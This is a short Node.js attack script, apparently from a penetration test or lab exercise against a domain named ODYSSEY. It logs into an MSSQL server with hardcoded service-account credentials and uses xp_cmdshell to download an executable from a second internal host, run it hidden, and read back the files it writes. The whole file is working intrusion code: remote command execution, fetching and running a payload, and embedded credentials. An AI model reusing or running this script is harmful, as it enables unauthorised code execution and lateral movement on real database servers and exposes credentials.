const sql = require("mssql");
(async () => {
  await sql.connect({
    server: "172.16.0.11", database: "master",
    authentication: { type: "ntlm", options: { domain: "ODYSSEY", userName: "svc-mssql", password: "cml958782" } },
    options: { encrypt: false, trustServerCertificate: true }, port: 1433, requestTimeout: 60000,
  });
  const q = async (s) => { try { console.log("=>", JSON.stringify((await sql.query(s)).recordset)); } catch(e){ console.log("ERR", e.message);} };
  await q("EXEC xp_cmdshell 'powershell -c \"Invoke-WebRequest -Uri http://172.16.0.12:8080/p_who.exe -OutFile C:/Users/Public/p_who.exe -UseBasicParsing\"'");
  await q("EXEC xp_cmdshell 'dir C:\\Users\\Public\\p_who.exe'");
  await q("EXEC xp_cmdshell 'powershell -c \"Start-Process C:\\Users\\Public\\p_who.exe -WindowStyle Hidden; Start-Sleep 12; Get-Process p_who -ErrorAction SilentlyContinue | ft; if (Test-Path C:\\Users\\Public\\who.txt) { Get-Content C:\\Users\\Public\\who.txt } else { \"NO_WHO\" }; if (Test-Path C:\\Users\\Public\\uf.txt) { Get-Content C:\\Users\\Public\\uf.txt } else { \"NO_UF\" }\"'");
  process.exit(0);
})().catch(e=>{console.log(e);process.exit(1)});
